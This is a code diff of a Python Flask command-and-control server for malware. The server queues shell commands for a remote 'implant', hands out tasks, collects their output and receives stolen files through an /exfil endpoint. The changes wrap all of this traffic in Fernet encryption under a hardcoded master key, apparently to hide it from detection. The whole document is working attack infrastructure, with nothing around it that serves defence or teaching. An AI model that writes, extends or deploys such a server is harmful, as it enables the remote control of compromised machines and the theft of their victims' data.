@@ -1,8 +1,14 @@
 from flask import Flask, request, jsonify
+from cryptography.fernet import Fernet
 import os
 import uuid
+import json
 
 app = Flask(__name__)
+
+# --- CRYPTO SETUP --- #
+MASTER_KEY = b"V9TcZqQXfTm53ri9vPoybLjQN0m0jtrFh09QXRZCi_s="
+cipher = Fernet(MASTER_KEY)
 
 # --- STATE --- #
 commandQ = []
@@ -49,24 +55,32 @@ def home():
 
 @app.route("/checkin", methods=["POST"])
 def checkin():
-    data = request.json
-    print("[+] Check-in received:", data)
-    results.append({"cmd": "checkin", "taskID": "SYSTEM", "output": f"Check-in from host: {data.get('host', 'Unknown')}"})
-    return jsonify({"status": "ok"})
+    try:
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
+        print("[+] Check-in received:", data)
+        results.append({"cmd": "checkin", "taskID": "SYSTEM", "output": f"Check-in from host: {data.get('host', 'Unknown')}"})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Checkin error: {e}")
+        return "ERROR", 400
 
-#takes the first command on the command queue and issues the task to the implant.
 @app.route("/command", methods=["GET"])
 def command():
     if not commandQ:
-        return jsonify({"status": "No Commands Queued"})
+        data = json.dumps({"status": "No Commands Queued"})
+        return cipher.encrypt(data.encode('utf-8')).decode('utf-8')
+        
     cmd = commandQ.pop(0)
     taskID = str(uuid.uuid4())[:8]
     tasks[taskID] = cmd
     inProgress[taskID] = cmd
     print(f'[+] Issuing task {taskID}: {cmd}')
-    return jsonify({"taskID": taskID, "command": cmd})
+    
+    data = json.dumps({"taskID": taskID, "command": cmd})
+    return cipher.encrypt(data.encode('utf-8')).decode('utf-8')
 
-#adds a command to the queue. Can be triggered via GET ?cmd=whoami or POST {"command":"whoami"}
 @app.route("/add_command", methods=["GET", "POST"])
 def add_command():
     if request.method == "POST":
@@ -78,10 +92,6 @@ def add_command():
     if not cmd:
         return jsonify({"error": "No command provided."}), 400
 
-    # allow builtin commands OR arbitrary shell commands if they aren't explicitly blocked
-    is_builtin = cmd in allowedCommands or cmd.startswith("exfil ")
-    is_shell = not is_builtin # Anything else goes to runCommand in Persistent.cpp
-    
     commandQ.append(cmd)
     print(f'[+] Command added to queue: {cmd}')
     
@@ -91,27 +101,41 @@ def add_command():
 
 @app.route("/result", methods=["POST"])
 def result():
-    data = request.json
-    taskID = data.get("taskID", "N/A")
-    output = data.get("output", "")
-    cmd = tasks.get(taskID, "initial_recon_or_unknown")
-    print(f"[+] Result received for {taskID} {cmd}: {output}")
-    
-    if taskID in inProgress:
-        del inProgress[taskID]
+    try:
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
         
-    results.append({"taskID": taskID, "cmd": cmd, "output": output})
-    return jsonify({"status": "received"})
+        taskID = data.get("taskID", "N/A")
+        output = data.get("output", "")
+        cmd = tasks.get(taskID, "initial_recon_or_unknown")
+        print(f"[+] Result received for {taskID} {cmd}: {output}")
+        
+        if taskID in inProgress:
+            del inProgress[taskID]
+            
+        results.append({"taskID": taskID, "cmd": cmd, "output": output})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Result error: {e}")
+        return "ERROR", 400
 
 @app.route("/exfil", methods=["POST"])
 def exfil():
-    data = request.json
-    filename = data.get("filename", "unknown_file")
-    b64data = data.get("data", "")
-    print(f"[+] Exfil received: {filename}")
-    
-    results.append({"taskID": "EXFIL", "cmd": f"exfil {filename}", "output": f"[Base64 Payload]\n{b64data}"})
-    return jsonify({"status": "received"})
+    try:
+        token = request.get_data().decode('utf-8').strip()
+        decrypted = cipher.decrypt(token.encode('utf-8'))
+        data = json.loads(decrypted)
+        
+        filename = data.get("filename", "unknown_file")
+        b64data = data.get("data", "")
+        print(f"[+] Exfil received: {filename}")
+        
+        results.append({"taskID": "EXFIL", "cmd": f"exfil {filename}", "output": f"[Base64 Payload]\n{b64data}"})
+        return "OK"
+    except Exception as e:
+        print(f"[-] Exfil error: {e}")
+        return "ERROR", 400
 
 # --- RUN --- #
 if __name__ == "__main__":
